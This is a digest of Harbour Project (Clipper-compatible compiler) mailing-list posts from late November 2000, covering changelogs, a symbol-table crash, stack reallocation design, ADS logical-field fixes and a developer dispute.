Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
Message-ID: <000b01c05973$df974dc0$8604d2cc@san.rr.com>

2000-11-28 11:40 UTC+0800 Brian Hays <bhays@abacuslaw.com>
   * contrib/rdd_ads/ads1.c
      * fixed retrieval of logical values
         NOTICE!! All logical fields were coming back as FALSE before!
   * contrib/rdd_ads/adsfunc.c
      * adsCopyTable respects filters now

   * source/rdd/dbcmd.c
      + added dbRelation, dbRSelect
   * source/rdd/workarea.c
      + implemented RelText, RelArea
   * source/rtl\disksphb.c
      *Changed default "" to NULL to fix "open" error
   * source/debug/debugger.prg
      * changed TGet to Get class reference


Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Tue Nov 28 15:41:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 15:41:02 2000
Subject: [Harbour] hb_dynSymGet() GPFs in latest code
Message-ID: <3A241837.B7147ED4@libero.it>

Hi,

latest cvs code, build dbu, run it with a database (better a small one
with few field, the one I attached on a message of mine yesterday is
good) on command line, try to input any value, you'll get a GPF inside
hb_dynSymGet().

regards.


Exception c0000005 at address 71eb8 
Called from TCLASS:CREATE(203)  
Called from TGETLIST(86)        
Called from READMODAL(46)       
Called from DOGET(938)          
Called from BROWSE(402)         
Called from DBU(465)            
                               
Process terminated by SIGSEGV       
core dumped                      
SYS1808: 
Il processo è terminato. Il codice per la diagnostica
software (codice dell'errore) è  0005.

(H:\repository\dbu)pmgdb dbu ..\test\test



-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 15:48:01 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Tue Nov 28 15:48:01 2000
Subject: [Harbour] hb_dynSymGet() GPFs in latest code
In-Reply-To: <3A241837.B7147ED4@libero.it>
Message-ID: <200011282047.eASKlbL24508@ev6.be.wanadoo.com>

Hi Maurilio

> latest cvs code, build dbu, run it with a database (better a small one
> with few field, the one I attached on a message of mine yesterday is good)
> on command line, try to input any value, you'll get a GPF inside
> hb_dynSymGet().
> 
> regards.
> 
> 
> Exception c0000005 at address 71eb8 
> Called from TCLASS:CREATE(203)  

Harghhhhhhhhhh, nooooooo ....
...
A few moment later, ...

Did you used the Flex or Simplex version of Harbour (Actually, just 
to know it) ?



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Tue Nov 28 16:30:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 16:30:03 2000
Subject: [Harbour] hb_dynSymGet() GPFs in latest code
References: <200011282047.eASKlbL24508@ev6.be.wanadoo.com>
Message-ID: <3A242387.8F93954F@libero.it>

Jean,

I use only Simplex since it came out (I like the fact it's smaller and
more compliant and that I need one tool less to build harbour).

I've found that I can remove this error changing line 194 of dynsym.c
from

s_pDynItems = ( PDYNHB_ITEM ) hb_xgrab( sizeof( DYNHB_ITEM ));     /*
Grab array */

to 

s_pDynItems = ( PDYNHB_ITEM ) hb_xgrab( sizeof( DYNHB_ITEM ) * 20000
);     /* Grab array */


That is forcing a bigger initial allocation of ram. But with 20000 I get

(H:\repository\dbu)dbu test.dbf

Unrecoverable error 9010: hb_xfree called with an invalid pointer


I can fix this error too setting initial value to 200000 (200K elements)
it's more or less 800Kb of memory, but until we fix this problem with
realloc I can leave with the fact that I'm allocating a little more
memory than strictly needed.

regards.

PS. This change will surely break DOS platform.



JF Lefebvre ha scritto:
> 
> Hi Maurilio
> 
> > latest cvs code, build dbu, run it with a database (better a small one
> > with few field, the one I attached on a message of mine yesterday is good)
> > on command line, try to input any value, you'll get a GPF inside
> > hb_dynSymGet().
> >
> > regards.
> >
> >
> > Exception c0000005 at address 71eb8
> > Called from TCLASS:CREATE(203)
> 
> Harghhhhhhhhhh, nooooooo ....
> ...
> A few moment later, ...
> 
> Did you used the Flex or Simplex version of Harbour (Actually, just
> to know it) ?
> 
> Best regards,
> 
> J. Lefebvre,
> Bruxelles,
> Belgium
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 16:41:01 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Tue Nov 28 16:41:01 2000
Subject: [Harbour] UnTrimmed aliases a bigger problem
Message-ID: <000b01c05983$bf9f7460$8604d2cc@san.rr.com>

I posted a msg a while back about the Select() function failing if the
passed string/symbolName had trailing spaces.
Concensus was to fix select() locally rather than having the DynSym*
functions worry about trimming strings.
This is fine, and I plan on doing that, but the problem also exists where a
string variable is used as an alias:

USE CLIENTS
cAlias := "CLIENTS   "     // This occurs when getting the string from a dbf
field
? (cAlias)->Last

This blows with an incorrect "Alias does not exist".
Since this isn't isolated in a function call, I'm not sure how many places
in the code would need to be prepared to trim the string, so perhaps
DynSymFind (if that's the right func name) does need to replace a first
space with a 0.....

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Tue Nov 28 17:07:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Tue Nov 28 17:07:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random   gpfs)
References: <3A23FFE7.31028.506E9F9@localhost>
Message-ID: <3A242C5C.3AC4C45B@libero.it>

Ryszard,

just one thing to clarify: if done right you won't have page faults
because you ask to your SO to fill that address area _before_ you need
to use it.

Just like now when you realloc your stack _before_ using last available
element.

regards.


Ryszard Glab ha scritto:
> 
> On 27 Nov 2000, at 12:24, John Skelton wrote:
> 
> > IAC, as I pointed out, Harbour has many non-ANSI functions in it.  I
> > see no particular problem with getting a good stack implementation in
> > return for a small amount more of such functions.
> 
>   Yes, they are handling platform specific tasks when there is no
> other possibility.
> 
> > "Additionally, these functions are not tested widely"
> >
> > You're kidding, right?  What evidence do you have for that claim?
> 
>   If they are used so often then why we didn't use them from the very
> beginning? Have we (harbour developers) any experience with these
> functions?
> 
> >
> > "OS specific solution can give better performance however at
> > the cost of decreased stability"
> >
> > Again, what evidence do you have?
> 
>   This is my impression after reading dejanews.com archives about
> VirtualAlloc.
> 
> > It's a slow and bloated solution.  I don't regard it as viable.  OTOH,
> > I don't intend to use it. :-)
> 
>   Well we will see if this ,,bloated'' solution is slower then
> handling of page faults caused by virtual memory usage.
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Tue Nov 28 17:09:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 28 17:09:02 2000
Subject: [Harbour] ChangeLog 2000-11-28 17:15 UTC-0400 David G. Holm <dholm@jsd-llc.com>
Message-ID: <200011282208.eASM8Cr20351@thor.parrett.net>

2000-11-28 17:15 UTC-0400 David G. Holm <dholm@jsd-llc.com>
   * include/hbapigt.h
     + Added non-DOS definitions of box drawing characters and strings.
   * source/rtl/oldbox.c
     % Changed to use same method to test and use numeric parameters as
       that used by source/rtl/box.c.
   * tests/boxtest.prg
     + Added display of box drawing statement used following each box
       draw, along with a wait for user input. Removed comment about
       the first __BOX() call not doing anything, because it does...
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 28 17:18:02 2000
From: harbour@lists.harbour-project.org (JF Lefebvre)
Date: Tue Nov 28 17:18:02 2000
Subject: [Harbour] hb_dynSymGet() GPFs in latest code
In-Reply-To: <3A242387.8F93954F@libero.it>
Message-ID: <200011282216.eASMGvL09445@ev6.be.wanadoo.com>

Maurilio

This would say that we suffer here some problem like the stack 
one... I say that because, just allocating a very big bunch of 
memory first time the symbol table is accessed, will avoid any 
further realloc.

So I suspect, that somewhere we store some symbol pointer then 
we add one or more causing a symbol table realloc then after all 
trying to use the first one will cause a GPF. 

The only good new is that when we will find a solution for the stack, 
we will be able to use it here also :-/


> I use only Simplex since it came out (I like the fact it's smaller and
> more compliant and that I need one tool less to build harbour).
> 
> I've found that I can remove this error changing line 194 of dynsym.c from
> 
> s_pDynItems = ( PDYNHB_ITEM ) hb_xgrab( sizeof( DYNHB_ITEM ));     /* Grab
> array */
> 
> to 
> 
> s_pDynItems = ( PDYNHB_ITEM ) hb_xgrab( sizeof( DYNHB_ITEM ) * 20000
> );     /* Grab array */
> 
> 
> That is forcing a bigger initial allocation of ram. But with 20000 I get
> 
> (H:\repository\dbu)dbu test.dbf
> 
> Unrecoverable error 9010: hb_xfree called with an invalid pointer
> 
> 
> I can fix this error too setting initial value to 200000 (200K elements)
> it's more or less 800Kb of memory, but until we fix this problem with
> realloc I can leave with the fact that I'm allocating a little more memory
> than strictly needed.
> 
> regards.
> 
> PS. This change will surely break DOS platform.
> 
> 
> 
> JF Lefebvre ha scritto:
> > 
> > Hi Maurilio
> > 
> > > latest cvs code, build dbu, run it with a database (better a small one
> > > with few field, the one I attached on a message of mine yesterday is
> > > good) on command line, try to input any value, you'll get a GPF inside
> > > hb_dynSymGet().
> > >
> > > regards.
> > >
> > >
> > > Exception c0000005 at address 71eb8
> > > Called from TCLASS:CREATE(203)
> > 
> > Harghhhhhhhhhh, nooooooo ....
> > ...
> > A few moment later, ...
> > 
> > Did you used the Flex or Simplex version of Harbour (Actually, just to
> > know it) ?
> > 
> > Best regards,
> > 
> > J. Lefebvre,
> > Bruxelles,
> > Belgium
> > 
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> > 
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> 
> -- 
> 
>  __________                   
> |  |  | |__| md2520@mclink.it 
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


From harbour@lists.harbour-project.org  Tue Nov 28 19:55:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 19:55:04 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A241446.31670.5567DE2@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEKHDHAA.ron@profit-master.com>

Ryszard,

> > For the benefit of anyone interested here is the "complex dependency"
> > Ryszard was referring to:
> >
> > <"complex dependency">
> >    if( hb_vm_uiIdleTask == hb_vm_uiIdleMaxTask )
> >    {
> >       hb_vm_uiIdleTask = 0;
> >       hb_vm_bCollectGarbage = TRUE;
> >    }
> > </"complex dependency">
>
>   ROTFL :)

If you only knew how many here are questioning your behavior, you wouldn't
be.

Ron


From harbour@lists.harbour-project.org  Tue Nov 28 20:08:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 20:08:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
In-Reply-To: <000b01c05973$df974dc0$8604d2cc@san.rr.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEKIDHAA.ron@profit-master.com>

Brian,

> 2000-11-28 11:40 UTC+0800 Brian Hays <bhays@abacuslaw.com>
>    * contrib/rdd_ads/ads1.c
>       * fixed retrieval of logical values
>          NOTICE!! All logical fields were coming back as FALSE before!

Are you sure?

I have *not* downloaded your corrections, yet moving between records and
displaying a logical field, works correctly. I do get .T. when expected.

Ron


From harbour@lists.harbour-project.org  Tue Nov 28 20:15:03 2000
From: harbour@lists.harbour-project.org (Sid Saylors)
Date: Tue Nov 28 20:15:03 2000
Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
References: <LOBBKAFMMFGJIKLMEPAKCEKIDHAA.ron@profit-master.com>
Message-ID: <3A245862.29461FF2@home.com>

Yep, it was broken Ron.

that was the problem i had, but only with ads i think

Sid.....


Ron Pinkas wrote:
> 
> Brian,
> 
> > 2000-11-28 11:40 UTC+0800 Brian Hays <bhays@abacuslaw.com>
> >    * contrib/rdd_ads/ads1.c
> >       * fixed retrieval of logical values
> >          NOTICE!! All logical fields were coming back as FALSE before!
> 
> Are you sure?
> 
> I have *not* downloaded your corrections, yet moving between records and
> displaying a logical field, works correctly. I do get .T. when expected.
> 
> Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

From harbour@lists.harbour-project.org  Tue Nov 28 20:24:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Tue Nov 28 20:24:02 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKIEKHDHAA.ron@profit-master.com>
References: <3A241446.31670.5567DE2@localhost>
Message-ID: <200011290123.eAT1NQr02948@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Tue,
28 Nov 2000 16:56:48 -0800

> If you only knew ...

Please give it a rest, Ron.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Tue Nov 28 21:15:04 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 21:15:04 2000
Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
In-Reply-To: <3A245862.29461FF2@home.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEKJDHAA.ron@profit-master.com>

Sid,

I am sorry to say so, but I added a MsgInfo( Logical->IsTrue ) to your
sample, and it does display .t. when expected! It does so with *both*
DBFCDX, and ADS!

In both cases it still, does *not* display the Check-Mark as expected.

Ron

> Yep, it was broken Ron.
>
> that was the problem i had, but only with ads i think
>
> Sid.....
>
>
> Ron Pinkas wrote:
> >
> > Brian,
> >
> > > 2000-11-28 11:40 UTC+0800 Brian Hays <bhays@abacuslaw.com>
> > >    * contrib/rdd_ads/ads1.c
> > >       * fixed retrieval of logical values
> > >          NOTICE!! All logical fields were coming back as FALSE before!
> >
> > Are you sure?
> >
> > I have *not* downloaded your corrections, yet moving between records and
> > displaying a logical field, works correctly. I do get .T. when expected.
> >
> > Ron


From harbour@lists.harbour-project.org  Tue Nov 28 21:24:02 2000
From: harbour@lists.harbour-project.org (Sid Saylors)
Date: Tue Nov 28 21:24:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
References: <LOBBKAFMMFGJIKLMEPAKGEKJDHAA.ron@profit-master.com>
Message-ID: <3A2468AB.2912A9E4@home.com>

Ron,
After brian's changes it displays the check-mark here.

Sid...



Ron Pinkas wrote:
> 
> Sid,
> 
> I am sorry to say so, but I added a MsgInfo( Logical->IsTrue ) to your
> sample, and it does display .t. when expected! It does so with *both*
> DBFCDX, and ADS!
> 
> In both cases it still, does *not* display the Check-Mark as expected.
> 
> Ron
> 
> > Yep, it was broken Ron.
> >
> > that was the problem i had, but only with ads i think
> >
> > Sid.....
> >
> >
> > Ron Pinkas wrote:
> > >
> > > Brian,
> > >
> > > > 2000-11-28 11:40 UTC+0800 Brian Hays <bhays@abacuslaw.com>
> > > >    * contrib/rdd_ads/ads1.c
> > > >       * fixed retrieval of logical values
> > > >          NOTICE!! All logical fields were coming back as FALSE before!
> > >
> > > Are you sure?
> > >
> > > I have *not* downloaded your corrections, yet moving between records and
> > > displaying a logical field, works correctly. I do get .T. when expected.
> > >
> > > Ron
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

From harbour@lists.harbour-project.org  Tue Nov 28 21:44:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 21:44:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A241263.15776.54F2052@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEKKDHAA.ron@profit-master.com>

Ryszard,

> > This kind of misleading information will not serve you well!
> >
> > Please tell me, what is your object here, and what is your proposed
> > change or fix?
>
>   Just try to delete an idle task from inside of idle task and see
> what will happen. And next please report where I wrote a misleading
> information.

I did not change the logic involved with processing the Idle blocks! I only
added the condition on the repeat!

This in *no* way has any bearing on the situations you describe. This bug
you describe was there before my change.

The misleading information, was describing 2 flags and 2 if()s as "complex
code".

> > Let's assume for a moment, that my implementation was wrong, is that
> > the way to address it? Did I not invite input? Did I decline or object
> > any suggestion?
>
>    Have you read the message you are responding? I have clearly wrote
> why your solution was wrong. Read it again and again. This is not the
> first time when you are commiting some code that is changing some
> behaviour without prior discussion. This was not a simple bug fix.

Sorry, I can not find any factual explanation of such. Please, show *in
code*, how you could simplify this logic, please*!

>  _GET_ support in flex version is not finished yet. Simplex support
> is not compatible with Clipper. Clipper is not using a preprocessor
> to supply a set/get codeblock (this is the reason why I have removed
> it initially from the preprocessor). I cannot predict now if this
> will cause problems in user defined GET implementation. Your solution
> is again breaking a modularization - it is placed in Simplex, bison
> and preprocessor. Flex solution is placed in the expression optimizer
> only.

You see, here is another *clear* misleading information!!! Please show us,
just 1 single sample that will not be Clipper compatible, regarding this
issue - *please*.

The whole process of compiling any Clipper Command, is made of these 3
steps, Pre-Process, Lexical analysis, and Context parsing. That is not
"breaking modularization", this is the reality of the process.

> > I sincerely respect your contribution to Harbour, and I hope you will
> > learn to respect mine. It appears to me you simply refuse accepting
> > that I'm capable of, did, do, and will continue contributing to
> > Harbour. Please let's find a way to co-exist, in a productive way.
>
>   Because I want a perfect harbour then I point wrong (in my opinion)
> solutions regardless their author. We can discuss them always. If you
> are receiving them as personal attacks then it is your problem.

Isn't it simpler and more respectful, to simply bring forward your ideas,
instead of criticizing someone else's work?

Let me give you an example:
-----
Ron contributes code that might be improved.

Ryszard: Ron, I suggest we change the direct reference in inkey.c of Idle
Flags into a Function in idle.c to improve modularization.

Or better yet, Ryszard, posts a changelog notice of such change.
-----

What I mean is, you didn't *offer* any *improvement*, it was plain
criticism.

Ron


From harbour@lists.harbour-project.org  Tue Nov 28 21:50:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 21:50:03 2000
Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
In-Reply-To: <3A2468AB.2912A9E4@home.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKGEKKDHAA.ron@profit-master.com>

Sid,

I'm happy to hear that, but I'm clueless!

Ron

> Ron,
> After brian's changes it displays the check-mark here.
> 
> Sid...


From harbour@lists.harbour-project.org  Tue Nov 28 22:59:02 2000
From: harbour@lists.harbour-project.org (April)
Date: Tue Nov 28 22:59:02 2000
Subject: [Harbour] hello, April to earth...
Message-ID: <3A247F4C.8E270F6A@user.rose.com>

I know I am wasting bandwidth, but I recently posted three messages to
the mailing
list, received a copy, and not a single reply nor comment has followed.

Now I know that I have some hair-brained ideas at times, but is there no
one
who can help me with:

- using params already on stack (setkey / F1 help bug)
- using djgpp with rsxntdj
- trapping .prg errors [within a full make]

ttfn
April


From harbour@lists.harbour-project.org  Tue Nov 28 23:27:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Tue Nov 28 23:27:02 2000
Subject: [Harbour] hello, April to earth...
In-Reply-To: <3A247F4C.8E270F6A@user.rose.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEKLDHAA.ron@profit-master.com>

April

I am not sure if every one received your messages, as it appears it was
addressed to harbour@matrixlist.com instead of
harbour@lists.harbour-project.org

As to your actual questions, sadly, I don't think I can assist.

Ron

> I know I am wasting bandwidth, but I recently posted three messages to
> the mailing
> list, received a copy, and not a single reply nor comment has followed.
>
> Now I know that I have some hair-brained ideas at times, but is there no
> one
> who can help me with:
>
> - using params already on stack (setkey / F1 help bug)
> - using djgpp with rsxntdj
> - trapping .prg errors [within a full make]
>
> ttfn
> April


From harbour@lists.harbour-project.org  Tue Nov 28 23:57:02 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Tue Nov 28 23:57:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random    gpfs)
In-Reply-To: <200011280550_MC2-BC54-8AA3@compuserve.com>
Message-ID: <3A244613.26012.ABB9799@localhost>

On 28 Nov 2000, at 5:50, John Skelton wrote:

> Phil,
> 
> JS> IAC, as I pointed out, Harbour has many non-ANSI functions in it. 
> I JS> see no particular problem with getting a good stack
> implementation in JS> return for a small amount more of such
> functions.
> 
> "many of our developers have been running with the ANSI checking flag
> on, which has eliminated most non-ANSI code."
> 
> Is that checking for calls to non-ANSI functions, i.e. functions not
> listed in the ANSI Std?

It flags errors on functioons not in the ANSI function list, or using 
parameters that are not in the ANSI standard function list.

> My point remains: surely we want a good stack implementation.  One
> that doesn't move the stack around!  And as I just posted yesterday
> that should be stack_s_, being both Eval stack & CPU stack.

Should? Maybe. Could? Definately.

The best answer will be a portable code dynamic stack that is fast. 
Next best is OS specific function calls.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Tue Nov 28 23:57:47 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Tue Nov 28 23:57:47 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random    gpfs)
In-Reply-To: <200011280550_MC2-BC54-8AA1@compuserve.com>
Message-ID: <3A244613.29421.ABB97C1@localhost>

On 28 Nov 2000, at 5:50, John Skelton wrote:

> Phil,
> 
> JS> as I have said there's nothing to stop there being a non-OS
> dependent JS> stack implementation as well as ones which are far
> better but OS- JS> dependent.
> 
> "Understandably, you have different goals"
> 
> Not really.  I think the stack should _not_ move around, as it breaks
> the kind of code we already have and which any person adding code
> would normally write, including the kind of code that works with
> Clipper.  I don't much care if the stack is a linked list, slow and
> bloated though it may be, as I'm in the (lucky?) situation of having
> users used to slow & bloated apps on a slow & bloated OS.  My concern
> is not for myself but for both Harbour's reputation and for other
> users who may well not want a poor stack mechanism.

Clippers dynamic memory allocation already subjects us to 
movable memory objects. Why is stack being indirected by one 
level any different?

-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Wed Nov 29 00:02:02 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Wed Nov 29 00:02:02 2000
Subject: [Harbour] hello, April to earth...
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKEEKLDHAA.ron@profit-master.com>
References: <3A247F4C.8E270F6A@user.rose.com>
Message-ID: <3A244756.17392.AC084A1@localhost>

On 28 Nov 2000, at 20:28, Ron Pinkas wrote:

> April
> 
> I am not sure if every one received your messages, as it appears it
> was addressed to harbour@matrixlist.com instead of
> harbour@lists.harbour-project.org

These both to the same thing. harbour@matrixlist.com is the 
master address. harbour@lists.harbour-project.org is a DNS alias.

-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Wed Nov 29 00:06:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Wed Nov 29 00:06:01 2000
Subject: [Harbour] hello, April to earth...
In-Reply-To: <3A247F4C.8E270F6A@user.rose.com>
Message-ID: <3A244862.1592.AC49E62@localhost>

On 28 Nov 2000, at 23:00, April wrote:

> I know I am wasting bandwidth, but I recently posted three messages to
> the mailing list, received a copy, and not a single reply nor comment
> has followed.
> 
> Now I know that I have some hair-brained ideas at times, but is there
> no one who can help me with:
> 
> - using params already on stack (setkey / F1 help bug)
> - using djgpp with rsxntdj
> - trapping .prg errors [within a full make]

I don't think anyone was ignoring you. Maybe nobody knew the 
answer...

Certainly, number three will be dealt with in spades after I port 
PBMake to Harbour.


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Wed Nov 29 01:49:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Wed Nov 29 01:49:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800
References: <LOBBKAFMMFGJIKLMEPAKCEKIDHAA.ron@profit-master.com>
Message-ID: <001301c059d0$57dc5120$8604d2cc@san.rr.com>

Hmm.  How sure can I be?
I had a database with True values in a logical, made a 5 line console test
that showed false for those values.
Wrote .t. to the field, then it still displayed .f.. Confirmed with BroPlus
that it was True.

Are you sure you had ADS loaded?  This was an ADS bug, not dbf or dbfcdx.
Either way, the code that was reading Logical values was seriously flawed
and is better now.

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: "Ron Pinkas" <ron@profit-master.com>
To: <harbour@lists.harbour-project.org>
Sent: Tuesday, November 28, 2000 5:10 pm
Subject: RE: [Harbour] CHANGELOG: 2000-11-28 11:40 UTC+0800


> Brian,
>
> > 2000-11-28 11:40 UTC+0800 Brian Hays <bhays@abacuslaw.com>
> >    * contrib/rdd_ads/ads1.c
> >       * fixed retrieval of logical values
> >          NOTICE!! All logical fields were coming back as FALSE before!
>
> Are you sure?
>
> I have *not* downloaded your corrections, yet moving between records and
> displaying a logical field, works correctly. I do get .T. when expected.
>
> Ron
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>


From harbour@lists.harbour-project.org  Wed Nov 29 03:40:05 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Wed Nov 29 03:40:05 2000
Subject: [Harbour] adir compatibility
Message-ID: <000f01c059df$c29cd110$8604d2cc@san.rr.com>

In clipper, all funcs that got directory or file info returned uppercase
file names.
Our Directory() and ADIR() retrieve mixed case under NT (It gives you
exactly what's in the directory).
Should we force these to upper? If not, users have to change equivalence
tests and ascan calls to code blocks testing upper()...
Should there be a switch/parameter added?

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Wed Nov 29 03:59:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Wed Nov 29 03:59:02 2000
Subject: [Harbour] hb_dynSymGet() GPFs in latest code
In-Reply-To: <3A242387.8F93954F@libero.it>
Message-ID: <3A24D45B.27640.2E3C2FE@localhost>

On 28 Nov 2000, at 22:28, Maurilio Longo wrote:

> s_pDynItems = ( PDYNHB_ITEM ) hb_xgrab( sizeof( DYNHB_ITEM ) * 20000
> );     /* Grab array */

  This shouldn't help much because this big memory block will be 
shrinked during inserting of second symbol 
(realloc( <symbols_count> * <size>))
s_pDynitems is an array of pointers to dynamic symbols. Reallocation 
of this array doesn't change the value of pointers stored. Unless we 
are using somwhere a direct address of a pointer but I cannot locate 
any such code at this moment.

Regards, Ryszard

From harbour@lists.harbour-project.org  Wed Nov 29 04:59:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 29 04:59:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <3A24D45B.27640.2E3C2FE@localhost>
Message-ID: <000001c059ea$9f38e820$0f2aa8c0@fivetechs>

As some of you may be aware, Harbour has a
dynamic symbols table. It works exactly the
same was as Clipper's one. I implemented it.

When I wrote it I found the exact problems
we are facing now with the stack. Now, I just
realized the stack may work the same way
(sorry to be so slow thinking... :-)

We need very minor changes to implement it.

The actual Harbour dynamic stack has the 
following architecture:

   HB_ITEM | HB_ITEM | HB_ITEM | HB_ITEM | ...

that is, an array of HB_ITEMs. When we reallocate
it, the addresses of those HB_ITEMs are no longer 
valid.

It is as simple as turning it into the following:

  PHB_ITEM | PHB_ITEM | PHB_ITEM | PHB_ITEM | ...

so now, no matter how the stack reallocates, PHB_ITEMs
point to the right place, always.

We just need to do some minor changes into the 
stack related functions, but basically they will work
exactly the same was as now.

This is how the Harbour dynamic symbols table work, and
it works great.

your thoughts ?

Antonio


From harbour@lists.harbour-project.org  Wed Nov 29 05:10:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 29 05:10:02 2000
Subject: [Harbour] easy solution for the dynamic stack
In-Reply-To: <000001c059ea$9f38e820$0f2aa8c0@fivetechs>
Message-ID: <000301c059ec$48d8de20$0f2aa8c0@fivetechs>

With this new implementation, when the stack
grows, it reallocates (a new chunk of PHB_ITEMs)
and allocates the HB_ITEMs for each PHB_ITEMs.

Those HB_ITEMs will be reused, over and over,
so there is no speed loss at all.


     HB_ITEM    HB_ITEM    HB_ITEM    HB_ITEM
       |          |          |          |  
    PHB_ITEM | PHB_ITEM | PHB_ITEM | PHB_ITEM | ...
      
       
HB_ITEMs never change their addresses. So simple.


Antonio


From harbour@lists.harbour-project.org  Wed Nov 29 05:27:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 29 05:27:02 2000
Subject: [Harbour] easy solution for the dynamic stack
